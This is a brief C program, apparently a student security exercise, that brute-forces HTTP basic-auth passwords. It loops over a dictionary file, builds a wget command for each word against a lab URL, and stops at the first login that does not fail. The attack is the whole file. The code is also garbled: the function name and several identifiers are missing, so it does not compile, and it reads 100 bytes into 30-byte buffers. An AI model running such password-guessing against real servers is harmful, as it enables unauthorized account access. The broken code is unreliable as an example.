#include<stdio.h>
#include<string.h>
#include<strings.h>
#include<stdlib.h>
#include<sys/time.h>

()
{
	int i,m,k,count=0;
	FILE* diction;
	FILE* log;
	char s[30];
	char pic[30];
	char add[1000];
	char end[100];
	time_t ,finish;
	double ttime;
	
	strcpy(add,"wget --http-user= --http-passwd=");
	strcpy( end,"-nv -o logd http://sec-crack.cs.rmit.edu./SEC/2/");
	diction=fopen("/usr/share/lib/dict/words","r");
	=time(NULL);
	while(fgets(s,100,diction)!=NULL)	
	{	
		printf("%s\n",s);
		for(m=40,k=0;k<(strlen(s)-1);k++,m++)
		{
			add[m]=s[k];
		}
		add[m++]=' ';
		for(i=0;i<50;i++,m++)
		{
			add[m]=end[i];
		}
		add[m]='\0';
		
		system(add);
		count++;
		log=fopen("logd","r");
		fgets(pic,100,log);
		printf("%s",pic);
		if(strcmp(pic,"Authorization failed.\n")!=0)	
		{
			finish=time(NULL);
			ttime=difftime(,finish);
			printf( "\n The time_var take:%f/n The  of passwords tried is %d\n",ttime,count);
			break;
		}
		fclose(log);
	}

}
